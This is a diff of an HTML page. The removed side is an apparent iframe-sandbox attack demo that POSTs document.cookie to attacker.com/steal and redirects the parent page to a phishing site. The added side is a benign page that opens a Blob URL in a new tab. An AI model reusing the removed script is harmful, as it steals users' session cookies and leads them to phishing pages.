@@ -2,25 +2,33 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Malicious exampleB.com</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Blob Protocol Example</title>
 </head>
 <body>
-  <h1>Malicious Content from exampleB.com</h1>
-  
+  <h1>Hi</h1>
   <script>
-    // Attacker's script that can run on exampleA.com due to allow-same-origin and allow-scripts
+    // Create a Blob with HTML content
+    const htmlContent = `<!DOCTYPE html>
+    <html lang="en">
+    <head>
+      <meta charset="UTF-8">
+      <meta name="viewport" content="width=device-width, initial-scale=1.0">
+      <title>Blob Protocol Example</title>
+    </head>
+    <body>
+      <h1>Hi</h1>
+    </body>
+    </html>`;
 
-    // Steal cookies from exampleA.com (via document.cookie)
-    fetch('https://attacker.com/steal', {
-      method: 'POST',
-      body: document.cookie
-    });
+    // Create a Blob object with MIME type "text/html"
+    const blob = new Blob([htmlContent], { type: 'text/html' });
 
-    // Redirect the parent (exampleA.com) to a malicious site
-    window.top.location.href = "https://phishing-site.com";  // Redirects parent page to a malicious URL
+    // Create a URL for the Blob
+    const url = URL.createObjectURL(blob);
 
-    // Example of DOM manipulation (changing content in the parent page)
-    document.body.style.backgroundColor = 'red';  // Alters parent page's appearance
+    // Open the Blob URL in a new tab
+    window.open(url, '_blank');
   </script>
 </body>
 </html>
